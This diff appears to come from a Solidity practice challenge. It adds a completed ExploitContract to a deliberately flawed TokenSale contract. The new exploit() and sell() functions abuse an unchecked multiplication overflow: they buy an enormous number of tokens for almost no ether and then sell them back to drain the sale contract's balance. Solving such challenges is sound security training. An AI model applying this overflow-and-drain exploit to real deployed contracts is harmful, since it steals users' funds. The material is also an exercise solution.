@@ -18,6 +18,7 @@ contract TokenSale {
         unchecked {
             total += numTokens * PRICE_PER_TOKEN;
         }
+
         require(msg.value == total);
 
         balanceOf[msg.sender] += numTokens;
@@ -28,7 +29,7 @@ contract TokenSale {
         require(balanceOf[msg.sender] >= numTokens);
 
         balanceOf[msg.sender] -= numTokens;
-        (bool ok, ) = msg.sender.call{value: (numTokens * PRICE_PER_TOKEN)}("");
+        (bool ok,) = msg.sender.call{value: (numTokens * PRICE_PER_TOKEN)}("");
         require(ok, "Transfer to msg.sender failed");
     }
 }
@@ -37,10 +38,32 @@ contract TokenSale {
 contract ExploitContract {
     TokenSale public tokenSale;
 
+    uint256 constant PRICE_PER_TOKEN = 1 ether;
+
+    uint256 public amountToSend;
+
     constructor(TokenSale _tokenSale) {
         tokenSale = _tokenSale;
     }
 
     receive() external payable {}
     // write your exploit functions below
+    //invariant: tokenSale ethers == total tokens sold * 1 ether + 1 ether
+
+    function exploit() public payable {
+        uint256 MAX = type(uint256).max;
+        uint256 x = MAX / PRICE_PER_TOKEN;
+
+        // uint256 amountToSend;
+        unchecked {
+            amountToSend = (x + (msg.value / 1 ether)) * PRICE_PER_TOKEN;
+        }
+        tokenSale.buy{value: amountToSend}((x + (msg.value / 1 ether)));
+    }
+
+    function sell() public {
+        //try to drain the contract
+        uint256 tokensToWithdraw = amountToSend / PRICE_PER_TOKEN + 1;
+        tokenSale.sell(tokensToWithdraw);
+    }
 }
